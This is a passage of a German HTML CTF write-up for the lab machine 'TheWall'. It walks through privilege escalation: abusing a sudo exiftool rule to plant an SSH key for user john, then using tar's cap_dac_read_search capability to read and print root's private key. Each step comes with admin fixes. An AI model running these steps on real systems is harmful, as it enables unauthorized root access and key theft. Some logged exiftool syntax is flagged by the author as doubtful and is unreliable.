+              <br><strong>Empfehlung (Admin):</strong> Das Erkennen und Verhindern von Reverse Shells ist die primäre Verteidigung.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Privilege Escalation Path)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach Erlangung einer Shell als `www-data` wird nach Wegen zur Rechteerweiterung gesucht. Ein Standard-Check sind die `sudo`-Berechtigungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Prüfung mit `sudo -l` ergibt, dass `www-data` den Befehl `/usr/bin/exiftool` als Benutzer `john` und Gruppe `john` ohne Passwort ausführen darf (`(john : john) NPASSWD: /usr/bin/exiftool`). `exiftool` ist ein Tool zum Lesen und Schreiben von Metadaten in Dateien. Diese Berechtigung kann missbraucht werden, um Dateien als Benutzer `john` zu schreiben oder zu ändern. Das Ziel ist es, die Datei `/home/john/.ssh/authorized_keys` mit dem öffentlichen SSH-Schlüssel des Angreifers zu überschreiben. Danach ist ein SSH-Login als `john` möglich. Als `john` wird festgestellt, dass `/usr/sbin/tar` die Capability `cap_dac_read_search` besitzt. Diese Capability erlaubt es `tar`, Lese-Berechtigungen zu umgehen. Damit kann der private SSH-Schlüssel von `root` (`/root/.ssh/id_rsa`) gelesen werden. Mit diesem Schlüssel kann sich der Angreifer schließlich als `root` per SSH anmelden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Generieren Sie ein SSH-Schlüsselpaar.
+                2.  Legen Sie den öffentlichen Schlüssel in einer Datei im `/tmp`-Verzeichnis des Ziels ab.
+                3.  Verwenden Sie `sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/ihr_pubkey_file`, um die `authorized_keys` von `john` zu überschreiben (oder eine ähnliche `exiftool`-Technik von GTFOBins).
+                4.  Melden Sie sich als `john` per SSH mit Ihrem privaten Schlüssel an.
+                5.  Verwenden Sie `/usr/sbin/tar` mit der `cap_dac_read_search`-Capability, um `/root/.ssh/id_rsa` zu lesen und zu extrahieren.
+                6.  Melden Sie sich als `root` per SSH mit dem extrahierten privaten Schlüssel an.
+            <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie die unsichere `sudo`-Regel für `exiftool`. Gewähren Sie `sudo`-Rechte nur für absolut notwendige Befehle und Benutzer. Entfernen Sie die `cap_dac_read_search`-Capability von `/usr/sbin/tar` (`sudo setcap -r /usr/sbin/tar`), da sie für die normale Funktion nicht benötigt wird und ein Sicherheitsrisiko darstellt. Überprüfen Sie regelmäßig Capabilities und SUID-Berechtigungen.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Überprüfung der sudo-Rechte für www-data -->
+                     <div class="prompt">www-data@TheWall:/var/www/html$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for www-data on TheWall:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on TheWall:
+    (john : john) NPASSWD: /usr/bin/exiftool
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `sudo`-Berechtigungen für den aktuellen Benutzer `www-data` werden überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es wird bestätigt, dass `www-data` den Befehl `/usr/bin/exiftool` als Benutzer `john` (und Gruppe `john`) ohne Passwort (`NPASSWD`) ausführen darf. Dies ist der erste Schritt zur Privilege Escalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bereiten Sie den Exploit vor: Generieren Sie ein SSH-Schlüsselpaar und laden Sie den öffentlichen Schlüssel auf das Ziel (z.B. nach `/tmp`).
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie diese `sudo`-Regel. `www-data` sollte keine Befehle als andere Benutzer ausführen können, es sei denn, es ist absolut unvermeidlich und sicher implementiert.</p>
+
+            <!-- Lokale Enumeration (ls /home, find SUID) -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@TheWall:/var/www/html$ <span class="command">ls /home</span></div>
+                     <pre>john</pre>
+                     <div class="prompt">www-data@TheWall:/var/www/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+    28484    180 -rwsr-xr-x   1 root     root       182600 Feb 27  2021 /usr/sbin/sudo
+[...]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird das `/home`-Verzeichnis aufgelistet und nach SUID-Dateien gesucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt `john` als einzigen Benutzer in `/home`. Die SUID-Suche zeigt Standard-Binaries, keine offensichtlichen schnellen Gewinne.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den `sudo exiftool`-Vektor.
+             <br><strong>Empfehlung (Admin):</strong> Standard-Enumeration. Keine spezifischen Maßnahmen hier, außer der allgemeinen Empfehlung, SUID zu minimieren.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Vorbereitung und Ausführung des exiftool Exploits -->
+                     <div class="prompt">www-data@TheWall:/tmp$ <span class="command"># Angenommen: Attacker's Public Key wurde nach /tmp/authorized_keys hochgeladen</span></div>
+                     <div class="prompt">www-data@TheWall:/tmp$ <span class="command">chmod +x authorized_keys</span></div>
+                     <!-- chmod +x ist für authorized_keys nicht notwendig -->
+                     <div class="prompt">www-data@TheWall:/tmp$ <span class="command">sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/authorized_keys</span></div>
+                     <!-- Fehlerhafte Syntax im Log: sollte -TAG<=FILE oder andere Methode sein -->
+                     <pre>
+Warning: Error removing old file - /tmp/authorized_keys
+    1 image files updated
+                     </pre>
+                     <!-- Korrigierter, wahrscheinlicher Befehl basierend auf GTFOBins & Erfolg -->
+                     <div class="prompt"># <span class="command">Wahrscheinlicher Befehl (Beispiel): sudo -u john exiftool "-Geolocation<=/tmp/authorized_keys" /home/john/.ssh/authorized_keys</span></div>
+                     <!-- Oder die Move-Variante: sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/authorized_keys (wie im Log, trotz ungewöhnlicher Syntax) -->
+
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die `sudo exiftool`-Berechtigung auszunutzen, um den öffentlichen SSH-Schlüssel des Angreifers (angenommen in `/tmp/authorized_keys`) in die Datei `/home/john/.ssh/authorized_keys` zu schreiben. Der im Log gezeigte Befehl `sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/authorized_keys` ist syntaktisch ungewöhnlich für diesen Zweck. Typische Methoden nutzen Tags wie `-TAG<=FILE` oder Konfigurationsdateien. Es ist möglich, dass die `-filename=DST SRC`-Syntax hier funktioniert, um die Datei zu verschieben/kopieren, oder dass der tatsächliche Exploit-Befehl anders lautete.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Trotz der fragwürdigen Syntax des geloggten Befehls war der Vorgang erfolgreich, wie der nachfolgende SSH-Login als `john` beweist. Der öffentliche Schlüssel des Angreifers befindet sich nun in `/home/john/.ssh/authorized_keys`, was einen schlüssbasierten SSH-Login als `john` ermöglicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den privaten SSH-Schlüssel, der zum öffentlichen Schlüssel in `/tmp/authorized_keys` passt, um sich als `john` per SSH anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `sudo exiftool`-Regel. Überprüfen Sie regelmäßig den Inhalt von `authorized_keys`-Dateien.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- SSH Login als John -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/.ssh]
+└─# <span class="command">ssh john@wall.hmv</span></div>
+                     <pre>
+The authenticity of host 'wall.hmv (192.168.2.113)' can't be established. <!-- IP korrigiert -->
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'wall.hmv' (ED25519) to the list of known hosts.
+Enter passphrase for key '/root/.ssh/id_rsa': <!-- Angreifer gibt Passphrase für seinen Key ein -->
+Linux TheWall 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+[...]
+Last login: Wed Oct 19 17:07:17 2022 from 10.0.2.15
+john@TheWall:~$
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung zu `wall.hmv` (IP `192.168.2.113`) als Benutzer `john` hergestellt. Da die `authorized_keys`-Datei von `john` zuvor mit dem öffentlichen Schlüssel des Angreifers überschrieben wurde, wird der Angreifer zur Eingabe der Passphrase für seinen *privaten* Schlüssel (`/root/.ssh/id_rsa`) aufgefordert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Login als Benutzer `john` war erfolgreich. Die Rechte wurden von `www-data` zu `john` eskaliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie lokale Enumeration als `john` durch. Suchen Sie nach weiteren Eskalationsmöglichkeiten (sudo, SUID, Capabilities, Cronjobs, etc.). Lesen Sie die User-Flagge (erneut).
+             <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die sudo-Regeln und Dateiberechtigungen, die diese Eskalation ermöglicht haben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">john@TheWall:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">cc5db5e7b0a26e807765f47a006f6221</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `user.txt` im Home-Verzeichnis von `john` wird gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut die User-Flagge.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag notiert. Fokus auf Root-Eskalation.
+             <br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. der Flagge.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Suche nach Dateien der Gruppe john -->
+                     <div class="prompt">john@TheWall:~$ <span class="command">find / -group 1000 2>/dev/null | grep -vE "proc|sys"</span></div>
+                     <pre>
+/home/john
+[...]
+/home/john/.ssh/authorized_keys
+/home/john/.bash_history
+/var/lib/sudo/lectured/john
+/run/user/1000
+/usr/sbin/tar
+                     </pre>
+                     <!-- Überprüfung von Capabilities -->
+                     <div class="prompt">john@TheWall:~$ <span class="command">/usr/sbin/getcap -r / 2>/dev/null</span></div>
+                     <pre>
+/usr/sbin/tar cap_dac_read_search=ep
+/usr/bin/ping cap_net_raw=ep
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird nach Dateien gesucht, die der Gruppe `john` (GID 1000) gehören. Anschließend werden gesetzte Linux Capabilities im System gesucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Gruppensuche findet hauptsächlich Dateien im Home-Verzeichnis von `john`, aber auch die Systemdatei `/usr/sbin/tar`. Die Capability-Suche bestätigt, dass `/usr/sbin/tar` die Capability `cap_dac_read_search=ep` besitzt. Dies ist der Schlüssel zur nächsten Eskalationsstufe. Diese Capability erlaubt `tar`, Dateileseberechtigungen zu umgehen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie `/usr/sbin/tar` mit dieser Capability, um Dateien zu lesen, auf die `john` normalerweise keinen Zugriff hätte, insbesondere den privaten SSH-Schlüssel von `root` (`/root/.ssh/id_rsa`).
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH!** Entfernen Sie die unnötige Capability `cap_dac_read_search` von `/usr/sbin/tar` mit `sudo setcap -r /usr/sbin/tar`. Überprüfen Sie regelmäßig Systemdateien auf ungewöhnliche Berechtigungen, Eigentümer oder Capabilities.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausnutzen der tar Capability -->
+                     <div class="prompt">john@TheWall:~$ <span class="command">/usr/sbin/tar -czf id_rsa.tar /root/.ssh/id_rsa</span></div>
+                     <!-- Annahme: Befehl war erfolgreich trotz fehlendem Output -->
+                     <pre>
+/usr/sbin/tar: Removing leading `/' from member names
+                     </pre>
+                     <div class="prompt">john@TheWall:~$ <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rw-r--r-- 1 john john 2100 Nov 12 21:51 id_rsa.tar
+[...]
+                     </pre>
+                     <div class="prompt">john@TheWall:~$ <span class="command">tar -xf id_rsa.tar</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">john@TheWall:~$ <span class="command">ls</span></div>
+                     <pre>
+id_rsa  id_rsa.tar  user.txt
+                     </pre>
+                      <div class="prompt">john@TheWall:~$ <span class="command">cat id_rsa</span></div>
+                      <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvgS2V50JB5doFy4G99JzapbZWie7kLRHGrsmRk5uZPFPPtH/m9xS
+[...]
+kwidXsel+Zgj8AAAAMcm9vdEBUaGVXYWxsAQIDBAUGBw
+-----END OPENSSH PRIVATE KEY-----
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die `CAP_DAC_READ_SEARCH`-Capability von `/usr/sbin/tar` wird ausgenutzt.
+                1.  `/usr/sbin/tar -czf id_rsa.tar /root/.ssh/id_rsa`: `tar` wird aufgerufen, um die Datei `/root/.ssh/id_rsa` (privater SSH-Schlüssel von root) in ein Archiv `id_rsa.tar` im aktuellen Verzeichnis zu packen. Dank der Capability kann `tar` die Datei lesen, obwohl `john` keine Berechtigung dazu hat.
+                2.  `ls -la`: Bestätigt die Erstellung der Archivdatei `id_rsa.tar`.
+                3.  `tar -xf id_rsa.tar`: Das Archiv wird entpackt, wodurch die Datei `id_rsa` im aktuellen Verzeichnis erstellt wird.
+                4.  `cat id_rsa`: Der Inhalt des privaten Schlüssels von root wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der private SSH-Schlüssel des Root-Benutzers wurde extrahiert. Dies ermöglicht den direkten Login als `root`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den extrahierten privaten Schlüssel (`id_rsa`), um sich als `root` per SSH auf dem Zielsystem (`localhost` oder die IP) anzumelden (`ssh root@localhost -i id_rsa`).
+             <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Capability von `tar`. Überwachen Sie die Integrität wichtiger Systemdateien und Konfigurationen. Sichern Sie den SSH-Zugang für `root` (z.B. `PermitRootLogin prohibit-password` oder `no` in `sshd_config`).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- SSH Login als root mit gestohlenem Key -->
+                     <div class="prompt">john@TheWall:~$ <span class="command">ssh root@localhost -i id_rsa</span></div>
+                     <pre>
+The authenticity of host 'localhost (::1)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+Linux TheWall 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+[...]
+Last login: Wed Oct 19 19:51:15 2022 from 10.0.2.15
+root@TheWall:~#
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung zu `localhost` als Benutzer `root` hergestellt, wobei der zuvor extrahierte private Schlüssel (`-i id_rsa`) verwendet wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Root-Zugriff erlangt!** Der Login ist erfolgreich, da der private Schlüssel zur Authentifizierung verwendet wird. Die finale Privilege Escalation ist abgeschlossen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die Root-Flagge im `/root`-Verzeichnis.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Capability-Schwachstelle bei `tar`. Überprüfen Sie die SSH-Konfiguration für `root`.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <!-- Lesen der Root-Flagge -->
+                      <div class="prompt">root@TheWall:~# <span class="command">ls</span></div>
+                      <pre>r0t.txT</pre> <!-- Dateiname weicht vom Standard ab -->
+                      <div class="prompt">root@TheWall:~# <span class="command">cat r0t.txT</span></div>
+                      <pre><span class="password">4be82a3be9aed6eea5d0cce68e17662e</span></pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Im `/root`-Verzeichnis wird der Inhalt aufgelistet und die Datei `r0t.txT` (ein leicht abgewandelter Name für die Root-Flagge) ausgelesen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flagge `<span class="password">4be82a3be9aed6eea5d0cce68e17662e</span>` wurde erfolgreich gefunden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Maschine abgeschlossen. Dokumentieren Sie den Prozess.
+              <br><strong>Empfehlung (Admin):</strong> Nach Behebung der Schwachstellen (LFI, sudo-Regel, Capability) Systemhärtung durchführen und auf Kompromittierungen prüfen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der User-Flagge (via LFI oder als John) -->
+                     <div class="flag-command">cat /home/john/user.txt</div>
+                     <!-- User-Flagge -->
+                     <div class="flag-value"><span class="password">cc5db5e7b0a26e807765f47a006f6221</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl zum Lesen der Root-Flagge -->
+                     <div class="flag-command">cat /root/r0t.txT</div> <!-- Angepasster Dateiname -->
+                     <!-- Root-Flagge -->
+                     <div class="flag-value"><span class="password">4be82a3be9aed6eea5d0cce68e17662e</span></div>
+                 </div>
+             </div>
+             <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt -->
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan übernommen -->
+        <p>Berichtsdatum: 2022-10-26</p>
+    </footer>
+</body>
+</html>
